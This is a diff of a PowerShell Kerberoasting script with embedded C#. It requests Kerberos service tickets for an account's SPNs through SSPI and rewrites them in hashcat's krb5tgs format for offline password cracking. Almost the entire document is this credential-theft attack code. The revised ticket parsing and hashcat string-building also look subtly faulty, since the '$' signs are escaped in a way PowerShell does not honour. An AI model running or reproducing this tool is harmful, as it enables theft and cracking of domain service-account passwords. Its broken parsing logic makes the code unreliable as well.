@@ -50,7 +50,7 @@ public class K {
         public IntPtr pBuffers;
     }
 
-    public static byte[] GetTicket(string spn) {
+    public static byte[] GetRawTicket(string spn) {
         IntPtr cred = IntPtr.Zero;
         IntPtr ctx = IntPtr.Zero;
         IntPtr expiry1 = IntPtr.Zero;
@@ -60,7 +60,7 @@ public class K {
         try {
             SecBuffer secBuf = new SecBuffer();
             secBuf.BufferType = 2; // SECBUFFER_TOKEN
-            secBuf.cbBuffer = 12288; // 0x3000 = 12KB buffer
+            secBuf.cbBuffer = 12288;
             secBuf.pvBuffer = Marshal.AllocHGlobal((int)secBuf.cbBuffer);
 
             IntPtr pSecBuf = Marshal.AllocHGlobal(Marshal.SizeOf(secBuf));
@@ -104,6 +104,7 @@ public class K {
 
             byte[] data = new byte[resultBuf.cbBuffer];
             Marshal.Copy(resultBuf.pvBuffer, data, 0, data.Length);
+
             return data;
         } finally {
             if (cred != IntPtr.Zero) FreeCredentialsHandle(cred);
@@ -113,8 +114,7 @@ public class K {
 "@
 
 function Get-KerberosTicketHashcatFormat {
-    [CmdletBinding()]
-    param(
+    param (
         [Parameter(Mandatory)]
         [string]$SamAccountName
     )
@@ -133,31 +133,39 @@ function Get-KerberosTicketHashcatFormat {
 
         foreach ($spn in $user.servicePrincipalName) {
             Write-Host "[+] Requesting TGS for SPN: $spn"
-            $ticketBytes = [K]::GetTicket($spn)
-            if ($ticketBytes -and $ticketBytes.Length -gt 0) {
-                $hex = -join ($ticketBytes | ForEach-Object { $_.ToString("x2") })
 
-                # Search for the checksum/cipher delimiter
-                $pattern = "a282.*?8202"
-                $match = [System.Text.RegularExpressions.Regex]::Match($hex, $pattern)
-                if ($match.Success) {
-                    $index = $match.Index
-                    $cipherHex = $hex.Substring($index)
-                    $checksumHex = $hex.Substring(0, $index)
-
-                    $realm = ($spn.Split("/")[1] -split "\.")[1..99] -join "."
-                    $spnSanitized = $spn.Replace("/", "~")
-
-                    Write-Host "[+] Hashcat Format:"
-                    Write-Output "`$krb5tgs$23$*${SamAccountName}*${realm}*${spnSanitized}*${checksumHex}*${cipherHex}"
-                } else {
-                    Write-Warning "Unable to parse TGS for Hashcat from ticket data."
+            try {
+                $ticketBytes = [K]::GetRawTicket($spn)
+                if (-not $ticketBytes) {
+                    Write-Warning "No ticket retrieved for $spn"
+                    continue
                 }
-            } else {
-                Write-Warning "Failed to retrieve TGS for SPN: $spn"
+
+                # Convert to hex string
+                $ticketHex = -join ($ticketBytes | ForEach-Object { $_.ToString("x2") })
+
+                # Find the checksum and cipher portions
+                $rc4Indicator = "1122000000000000"
+                $splitIndex = $ticketHex.IndexOf($rc4Indicator)
+                if ($splitIndex -eq -1) {
+                    Write-Warning "RC4 checksum pattern not found in ticket for $spn"
+                    continue
+                }
+
+                $checksumHex = $ticketHex.Substring($splitIndex + $rc4Indicator.Length, 32)
+                $cipherHex = $ticketHex.Substring($splitIndex + $rc4Indicator.Length + 32)
+
+                # Build hashcat format string
+                $realm = "$env:USERDOMAIN"
+                $spnSanitized = $spn.Replace(":", "~")
+                $hashcat = "\$krb5tgs\$23\$*${SamAccountName}*${realm}*${spnSanitized}*${checksumHex}*${cipherHex}"
+
+                Write-Host "[+] Hashcat Format:`n${hashcat}"
+            } catch {
+                Write-Warning "Error while processing SPN '${spn}': $_"
             }
         }
     } catch {
-        Write-Error "Error: $_"
+        Write-Error "Active Directory query failed: $_"
     }
 }
